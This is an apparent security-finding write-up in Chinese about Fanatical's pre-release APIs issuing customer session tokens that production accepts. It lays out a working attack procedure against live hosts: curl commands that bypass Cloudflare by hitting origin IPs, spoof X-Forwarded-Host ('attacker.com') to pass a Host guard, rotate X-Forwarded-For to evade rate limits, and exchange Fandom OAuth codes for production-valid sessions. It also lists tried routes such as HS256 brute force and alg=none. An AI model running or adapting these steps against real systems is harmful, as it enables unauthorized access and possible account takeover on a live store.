# Fanatical：apiprelive/apitesting 预发布 Fandom SSO 签发的顾客会话在生产有效（环境隔离失效）

## 结论（一句话）

`apiprelive.fanatical.com` 与 `apitesting.fanatical.com` 两套预发布 API 与生产（`www.fanatical.com` / `ws15.fanatical.com` 顾客面、生产 admin）**共享顾客用户库、会话令牌存储与购物车存储**：
在预发布上完成 Fandom OAuth 授权码交换（HTTP 200）签发的 customer token，被生产 `/api/user/refresh-auth`、`/api/user/orders` 直接接受并返回同一生产用户对象；
同一 anonid 的购物车在 apiprelive / apitesting / 生产 ws15 三处返回**字节完全一致**（1685B，sha256 相同），而 apistaging 返回空 `[]`（2B）。
即：一个免费 Fandom 账号即可经「预发布」环境取得生产有效登录会话（生产自身 `POST /api/auth/fandom/` 因配置漂移恒 400 E802 不可用），且预发布环境的任何服务端缺陷会直接作用于生产数据。

token 形态 = `<24hex 用户 _id>.<uuid 会话后缀>`，**不是 JWT**（不要再做 HS256/alg 强度验证）。
认证判据：401 = 不认这个人；403 = 认了这个人、只是 RBAC 拒绝。

## 前置条件

1. 一个可用的 Fandom 账号（可免费注册；本环境用一次性自建账号，正文不保留账号/口令）。
2. 可出网 443；**curl 必须 `--noproxy '*'`** 源站直连（本机挂代理会重解析 DNS 使 `--resolve` 失效、请求回到 Cloudflare）。
   GA 源站 IP 现取：`nslookup -type=A <host>.herokudns.com 1.1.1.1`（会变；本次 apiprelive / ws15 均为 3.33.161.45）。
3. headful Chromium（xvfb-run + `/snap/bin/chromium` + puppeteer-core）用于走完 Fandom Hydra 登录/consent；
   `auth.fandom.com` 有 Cloudflare 挑战，纯 HTTP 注册/登录路线已证否（见 kb#736）。
4. `/api/auth/*` 族需 `anonid: <UUIDv4>` 请求头，全流程复用**同一个** anonid；UA 用浏览器类（裸 curl UA 会被边缘拦）。
5. 应用层 Host 守卫：请求带 `Host: apiprelive.fanatical.com`（或 apitesting），并补 `X-Forwarded-Host: attacker.com` 越过 Host 守卫（finding#1652 原语）。
6. 每个请求用唯一 `X-Forwarded-For: <UUID>` 换令牌桶（kb#596），避免 429。

## 复现步骤

### 0) 准备变量

```bash
UA="$ARTEX_UA"
ANON=$(cat /proc/sys/kernel/random/uuid)
IP=$(nslookup -type=A apiprelive.fanatical.com.herokudns.com 1.1.1.1 | awk '/^Address: /{print $2; exit}')
```

### 1) 预发布取 Fandom 授权 URL（apiprelive；apitesting 同法）

```bash
curl -sk --noproxy '*' --resolve apiprelive.fanatical.com:443:$IP \
  -H 'Host: apiprelive.fanatical.com' \
  -H 'X-Forwarded-Host: attacker.com' \
  -H "X-Forwarded-For: $ANON" \
  -H "anonid: $ANON" \
  -A "$UA" \
  'https://apiprelive.fanatical.com/api/auth/fandom/?redirectUrl=%2Fen%2Faccount%2Flogin&lang=en'
```

判据：HTTP 200，body 的 `authorizationUrl` 中
`client_id=511097b2-be3f-4dd5-9452-69c1718ebed3`，
`redirect_uri=https%3A%2F%2Fprelive.fanatical.com%2Fen%2Ffandom-auth-return`（apitesting 时 redirect_uri 指向 `apitesting.fanatical.com` 的对应回调）。

### 2) 浏览器完成 Fandom 授权，截获一次性 code

注入 Fandom 账号 cookie（或让脚本自动登录）打开第 1 步的 `authorizationUrl`，完成 Hydra 登录/consent。
若被 Cloudflare Access 中转，最终 302 形如：

```
https://fanatical.cloudflareaccess.com/cdn-cgi/access/login/prelive.fanatical.com?...&redirect_url=%2Fen%2Ffandom-auth-return%3Fcode%3Dory_ac_<REDACTED>%26state%3D<UUID>
```

`code` 在 `redirect_url` 参数里（URL-decode 一次取出），**不需要通过 CF Access**；code 只能用一次且必须与发起时的 `state` 配对。

### 3) 预发布交换授权码，签发顾客 token

```bash
curl -sk --noproxy '*' --resolve apiprelive.fanatical.com:443:$IP \
  -H 'Host: apiprelive.fanatical.com' \
  -H 'X-Forwarded-Host: attacker.com' \
  -H "X-Forwarded-For: $ANON" \
  -H "anonid: $ANON" \
  -H 'Origin: https://prelive.fanatical.com' \
  -H 'Content-Type: application/json' \
  --data '{"code":"ory_ac_<REDACTED>","state":"<UUID>","snowplowId":"<UUID>","snowplowSessionId":"<UUID>","language":"en"}' \
  'https://apiprelive.fanatical.com/api/auth/fandom/'
```

判据：HTTP 200，返回

```json
{"_id":"<24hex 用户ID>","email":"<自建账号>","role":"customer",
 "email_confirmed":true,...,"token":"<24hex 用户ID>.<uuid 会话后缀>"}
```

apitesting.fanatical.com 用同一 Fandom 账号同法交换 → 200，**同一 `_id`、另一个 token**（说明两预发布实例共用用户库/会话签发层）。

### 4) 生产验活（跨环境信任的直接证据）

```bash
curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:$IP \
  -H 'Host: ws15.fanatical.com' \
  -H 'X-Forwarded-Host: www.fanatical.com' \
  -H "X-Forwarded-For: $ANON" \
  -H "anonid: $ANON" \
  -H "Authorization: $TOKEN" \
  'https://ws15.fanatical.com/api/user/refresh-auth'
```

判据：HTTP 200（约 918B），`_id` / `email` / `created` 与第 3 步**完全一致**。
`www.fanatical.com/api/user/refresh-auth` 边缘同样 200（用 `Authorization: Bearer $TOKEN`）。
再打 `GET /api/user/orders` → 200 `[]`（2B）即完成生产顾客会话验活。

### 5) 隔离矩阵（一条条打，缺一不可）

| 来源 token | 目标 | 结果 |
|---|---|---|
| prelive | apiprelive `/api/user/refresh-auth` | 200 / 918B（同一用户） |
| prelive | apitesting `/api/user/orders` | 200 / `[]` |
| prelive | apistaging `/api/user/orders` | **401 / 28B `Invalid authorization header`** |
| prelive | ws15 生产 `/api/user/refresh-auth` | 200 / 918B（同一用户） |
| prelive | ws15 生产 `/api/user/orders` | 200 / `[]` |
| prelive | adminstaging `/api/admin/users` | 401 / 45B `User not authenticated` |
| apitesting | apiprelive / ws15 生产 refresh-auth | 200 / 918B（同一用户） |
| apistaging | 生产 / apiprelive refresh-auth | 401 / 28B |
| 无 token | ws15 refresh-auth | 401 `Missing authorization header` |
| 垃圾 token | ws15 refresh-auth | 401 `Invalid authorization header` |
| 任一预发布 customer token | `POST /api/admin/previews/carousel`（四环境） | **403 `User not permitted to advert:view`** |

结论：只有 apiprelive / apitesting ↔ 生产互通；apistaging 与生产不共享会话，排除「全环境互通」。
生产 admin 上 401→403 的跃迁表示认证层已接受 token，只剩 RBAC。

### 6) 同库 / 同购物车存储实证

用同一 anonid 在 apiprelive `POST /api/basket` 加购（常规加购 body，见 kb#554），随后三处读车并比对：

```bash
for H in apiprelive.fanatical.com apitesting.fanatical.com; do
  curl -sk --noproxy '*' --resolve $H:443:$IP \
    -H "Host: $H" -H 'X-Forwarded-Host: attacker.com' \
    -H "X-Forwarded-For: $ANON" -H "anonid: $ANON" -A "$UA" \
    "https://$H/api/basket" -o basket_$H.json
done
curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:$IP \
  -H 'Host: ws15.fanatical.com' -H 'X-Forwarded-Host: www.fanatical.com' \
  -H "X-Forwarded-For: $ANON" -H "anonid: $ANON" -A "$UA" \
  'https://ws15.fanatical.com/api/basket' -o basket_prod.json
sha256sum basket_*.json
```

判据：apiprelive / apitesting / 生产 ws15 三份均为 1685B 且 sha256 同为
`b204d13f96e9bbc79e798d2e31f99d63aa28d85a3ea1c6e52c3f91862bb2471f`；
apistaging 同请求返回 `[]`（2B）。
三处字节一致证明共享的不只是签名密钥，而是**同一用户库与同一购物车存储**。

## 失败时的常见原因

| 现象 | 原因 |
|---|---|
| 401 `Invalid authorization header` | token 不是预发布签发（staging/adminstaging 的 token 打生产也是这个），或 token 被截断/过期/引号里带空格 |
| 401 `Missing authorization header` / `User not authenticated` | 没带 Authorization，或缺 `Bearer ` 前缀 |
| 400 `Request blocked` | 缺 `anonid`（必须合法 UUIDv4），或裸 curl UA 被边缘爬虫门禁拦 |
| 302 到 `fanatical.cloudflareaccess.com` | 没 `--noproxy '*'` 源站直连，或没补 `X-Forwarded-Host` 越 Host 守卫；GA IP 也可能已变，重新 nslookup |
| 生产 `POST /api/auth/fandom/` → 400 E802 | 生产侧硬墙（真实浏览器流程同样 400）；别在这条路上耗，改走预发布签发 |
| 带 token 仍是 401 而非 403 | 该路由不走共享会话（不同 app），或 token 属于另一个环境 |
| code 交换失败 | code 一次性/已用过、state 不配对，或浏览器落在 CF Access 页时没从 `redirect_url` 参数解码 code |

## 影响边界与明确未达成

- 已达成：两套预发布 → 生产的**认证层**跨环境信任；生产 customer 会话可由预发布签发并验活；共享用户库与购物车存储。
- 攻击成本：仅需一个免费 Fandom 账号；若验证者可控的 Fandom email 与**既有**生产账号一致，可接管该账号（本次为新建账号，未验证该前提）。
- 未达成：生产后台数据（`/api/admin/*` 全线 RBAC 403）、权限提升、他人订单/礼卡。
- 环境隔离失效的延伸风险：预发布环境的任何服务端缺陷（注入、越权、反序列化等）将直接作用于生产数据。

## 相邻已证否路线（别重复）

- staging / staging2 / adminstaging 签发的会话打生产：全 401，不共享会话存储/签名密钥（kb#711）。
- 生产 www 直走 Fandom OAuth 登录：后端 400 E802 硬墙（kb#730）。
- 生产 admin JWT 面：5,199 个 HS256 候选 + alg=none/kid/jku 全矩阵恒 401，token 是不透明会话令牌（kb#681）。
- Fandom Kratos/Hydra 注册 API 纯 HTTP 取 code：1052 + 全站 CF 挑战，需 headful 浏览器（kb#736）。
- apiprelive/apitesting 店面 `/api/user/*` 自更新写面注入 adminRoles：严格字段白名单，证否（kb#740）。